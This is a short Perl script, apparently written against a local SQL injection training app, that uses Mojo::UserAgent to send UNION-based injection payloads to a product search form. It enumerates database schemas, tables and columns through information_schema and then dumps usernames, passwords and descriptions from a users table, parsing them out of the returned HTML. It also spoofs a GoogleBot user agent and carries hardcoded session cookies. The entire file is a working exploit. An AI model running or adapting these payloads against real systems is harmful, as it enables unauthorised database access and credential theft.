#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
use Mojo::Base qw( -strict -signatures );
use Mojo::Util qw(getopt trim encode unquote term_escape dumper url_escape);
use Mojo::Promise;
use Mojo::UserAgent;
use Data::Dumper;

my $concurrency=10;

getopt
    'c|concurrency=i' => \$concurrency;

my $url = "http://127.0.0.1:8000/searchproducts.php";
#curl 'http://127.0.0.1:8000/searchproducts.php' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: PHPSESSID=931e0823a98fc595c4c19976be1f6b9b' --data-raw 'searchitem=123123'

my $ua = Mojo::UserAgent->new;
#$ua->proxy->http('http://127.0.0.1:8080');

my $headers = {
    "Cookie"        => "PHPSESSID=018eec8fa8cac8569554c698931faf69",
    "User-Agent"    => "GoogleBot",
    "Content-Type"  => "application/x-www-form-urlencoded",
};

my @sqli1 = ("1' union select 1,2,3,schema_name,5 from information_schema.schemata-- -",
            "1' union select 1,2,3,table_name,5 from information_schema.tables where table_schema='sqlitraining'-- -",
            "1' union select 1,2,3,column_name,5 from information_schema.columns where table_schema='sqlitraining' and table_name='users'-- -",
            "1' union select 1,2,3,concat(username,0x3a,password,0x3a,description),5 from sqlitraining.users-- -");

my @sqli = map{url_escape $_} @sqli1;

#say dumper @sqli;

my $get_fast = Mojo::Promise->map({concurrency=>$concurrency}, sub {
    $ua->post_p($url => $headers => "searchitem=$_")}, @sqli)
    ->then(sub {
            foreach (@_) {
                #say $_->[0]->req->to_string;
                my ($inyection) = $_->[0]->res->dom
                                    ->find('tr td[style$=px]')#style q' tenga al final px
                                    ->map('all_text')
                                    ->join(",");

                my @array = split ',', $inyection;

                #say $inyection;

                my @databases=grep{/\S/} map{$_ if($_=~/^[a-zA-Z_-]+$/gi)} @array;#con el grep quitamos todos los elementos vacios ""
                print join "\n", grep{/\S/} grep{/.*\:.*\:.*/} @array;
                #say join "\n", @databases;

                #say $_->[0]->res->to_string;
            }
        });

$get_fast->wait;
